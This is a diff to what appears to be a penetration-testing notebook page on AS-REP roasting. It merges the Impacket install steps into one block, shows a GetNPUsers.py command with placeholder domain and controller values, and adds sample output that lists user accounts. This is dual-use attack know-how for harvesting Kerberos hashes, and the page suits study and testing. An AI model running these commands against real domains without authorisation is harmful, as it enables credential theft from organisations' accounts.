@@ -47,31 +47,29 @@ If the target user has "Does not require Kerberos pre-authentication" enabled, y
 
 `GetNPUsers.py` is not included in Kali Linux by default. However, it is part of the `Impacket` suite, which you can install on Kali. Here’s how to set it up:
 
-#### 1. **Install Impacket**
-
-*   If you haven't already, clone the Impacket repository:
-
-    {% code overflow="wrap" %}
-    ```bash
-    git clone https://github.com/SecureAuthCorp/impacket.git
-    ```
-    {% endcode %}
-*   Navigate to the Impacket directory:
-
-    ```bash
-    cd impacket
-    ```
-*   Install Impacket:
-
-    ```
-    sudo python3 -m pip install .
-    ```
+{% code overflow="wrap" %}
+```bash
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+sudo python3 -m pip install .
+```
+{% endcode %}
 
 {% code overflow="wrap" %}
 ```bash
 python3 examples/GetNPUsers.py <domain>/<username> -dc-ip <domain-controller-ip> -request
 ```
 {% endcode %}
+
+Responses might look like this
+
+```
+[-] User delta doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User gama doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User reception doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User scans doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User temp doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
 
 ## Kerbrute
 
